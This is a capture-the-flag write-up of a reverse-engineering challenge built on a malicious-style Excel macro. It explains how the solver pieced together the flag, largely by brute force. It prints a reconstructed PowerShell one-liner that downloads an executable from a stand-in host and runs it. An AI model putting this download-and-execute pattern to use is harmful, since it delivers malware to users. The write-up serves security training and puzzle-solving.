# PROMPT 

I found a excel sheet with some great deals thanks to some random guy on the internet! Who doesn't trust random people off the internet, especially from email

The flag is the file name that was attempted to be downloaded, wrapped in utflag{} Note: the file imitates malicious behavior. its not malicious, but it will be flagged by AV. you probably shouldn't just run it though.

By Samintell (@samintell on discord)

# SOLUTION

This was very dumb... The reversing part was very straight forward, however. 

All we have to do is follow the order in which the command string is generated and then answer the question: "What file is being queried?" 

The command file being generated is something like:

```
poWeRsHELL -command "$oaK = new-object Net.WebClient;$OrA= 'http://fruit.gang/malware';$ CNTA = 'banANA-Hakrzf3zsd283209182afd4';$jri=$env:public+'CNTA+'.exe';try{$oaK.DowloadFile($Ora, $jri)Invoke-Item $jri;break;} catch {}"
```

I am sure I have some punctuation wrong somewhere, but all we care about is the final value of `$jri` to solve the challenge. 

I literally had to brute force the answer because whatever the "intended" method is for weeding out the "obfuscation" statements, I couldn't figure it out. 

Below is what I tried so you know I wasn't just being lazy and brute forcing, but first let me explain what these "obfuscation" statements were.

So, the straightforward part of the challenge is that if-then statements are creating a larger command string based on the value of cells in an excel sheet.

For example, `if A1 == "<random b64 data>", then command_str += "shell -c"`

That is fine, except that every now and then there were legitimate if statements that just added garbage to the middle of the string. 

I *thought* the intention of this challenge was to discover how to weed out the garbage if statements, because the reversing part was so simple otherwise; however, I did not find a consistent way to do this.

For example, *in the part of the RE challenge that actually generates the flag itself* there was this statement:

```
If Sheets("Sheet2").Range("G39").Value = "MZZ/er++" Then
cmd_str = cmd_str + "f3zsd"
```

We now know *for a fact* this is a garbage statement since the flag does not contain these characters but the if statements surrounding this one are required to be hit to build the flag (and if those statements are hit, this one must also be hit). 

So, I figured the question was "Tell me why this statement is not true." By the way, I chose this example because it was perfect in every way except that the characters look a little less than "random", but if you noticed that, just forget it, there are plenty of other examples of garbage statements that appear truly random.

# What we tried

We see a comment in one of the excel macros that says "Base64 for 8 bytes to represent 6 bytes of data." Now, I hadn't had my coffee yet, so I forgot that base64 being a standard means that *all 8 byte strings of legitimate base64 can be decoded in 6 bytes of data*. Forgetting that momentarily, I wrote a script to test the base64 strings in the if statements to see if any did not decode to 6 bytes. Obviously, they all did decode to 6 bytes *except* I found exactly 1 if statement that included a 7-char base64 string, which violates the base64 standard. Ah ha! I found a garbage statement! And it was! The command string made more sense when this line was removed.

So, I thought, great! I was right about the challenge!

I then checked the macros again to see that the author wrote their own base64 alphabet variable, and the "=" sign was not included. This means that every value that has an "=" in it, is also not valid! Correct again! I removed *more* garbage statements. 

This is a clever challenge, I thought, but that is where it stopped. In the example above, for instance, I thought... ok, this *must* be a garbage statement, so how do we weed it out?

Do we decode it to see if it makes sense? Didn't work.
What if it decodes into non-ASCII? Doesn't matter. Necessary values do to.
What if it decodes into non-printable chars? Same as previous answer.
What if it has repeating characters ("ZZ" or "++" in this example)? Same as previous answer.
Forward slash? See previous answer.
Plus sign? Previous.

Okay... so some garbage values are legitimately randomly generated base64 characters that match all base64 characteristics of necessary statements... So... what's next?

The excel data! I figured, the macro must be targeting a specific range of cells. What if the garbage statements are outside of those cells? Also, there was an "example" excel sheet given which only populated a very small subset of cells!

This looked promising, but immediately it became clear the "example" spreadsheet is a red herring and necessary statements reference cells that fall far outside of the example range anyway. Also, there was no noticeable pattern of cells that were used (such as, are all garbage values past column "F" -- there were necessary values at the beginning and end of the column alphabet excluding double-characters such as "AA", but no garbage values were found there either).

Ok, so we have garbage values that fall within the required range and meet all characteristics of base64 we care about and have weeded out already... So, what's next? 

Ah! I know! The flag must be something human readable! This is the only way it makes sense... We have reversed the challenge enough to know that we *only* care about garbage statements if they interrupt the flag! So, we can forget about weeding out *most* of the garbage values in the challenge. The flag is composed of 8 or so statements, so we have now significantly reduced what we even care about checking for, so let's just put the flag together and see what makes it human readable! 

Man, I'm so smart. 

Here are the values we have for the flag. They must be in this order if they are used, but any one "block" of characters can be removed. So, no swapping around.

"banA" "NA-H" "akrz" "f3zsd" "2832" "0918" "2afd"

If you are looking at the challenge and are wondering why I ignored the value in between "banA" and "NA-H", it is because it was weeded out as a garbage value by one of our previous tests. Also, we know for a fact already from RE that the value must end with "4.exe", so I have left that out.

So, we immediately see that "banANA-Hakrz" (banana hackers) is human readable. Awesome! But... then we have random numbers and letters... 

This is where I got the idea to "brute force", because, realistically, we don't need an overwhelming amount of guesses to get this right. 

We have 1 full version (banANA-Hakrzf3zsd283209182afd)
For each non-readable "block" we can remove 1, 2, 3, or 4. We can remove 1 three times for each "block". Because we can't switcheroo, we can only remove 2 "blocks" three times (first two, middle two, last two). And for the same reason we can only remove 3 twice (first three, last three). And, finally and perhaps most obviously we can just remove all of them one time.

So that's 1 full, we can keep 1 "block" the same 3 times for each "block" (3 * 4 == 12), add 3 for our ways to remove two "blocks", 2 for 3 and finally carry the one. 

This comes out to be something like five hundred thousand possible flags (19 actually, I think...). 

In my opinion, 19 possible flags for a challenge like this is very dumb, but, we do what we gotta do, I guess.

So, after 16 guesses, I found that "utflag{banANA-Hakrz09182afd4.exe}" was the correct flag (remember what I said before that we knew it had to end in "4.exe" anyway, so that was a given).

This means that we had to somehow find a way to exclude "f3zsd" *and* "2832" as garbage statements, which I could not do. Here are their respective if-statements along with the legitimate ones if you would like to see if you can determine the trick:

```
If Sheets("Sheet2").Range("G39").Value = "MZZ/er++" Then
cmd_str = cmd_str + "f3zsd"
End If
If Sheets("Sheet2").Range("B93").Value = "ZX42cd+3" Then
cmd_str = cmd_str + "2832"
End If
If Sheets("Sheet2").Range("I15").Value = "e9x9ME+E" Then
cmd_str = cmd_str + "0918"
End If
If Sheets("Sheet2").Range("T46").Value = "7b69F2SI" Then
cmd_str = cmd_str + "2afd"
End If
```

The first two should "fail" and last two should "succeed". I wish you the best.
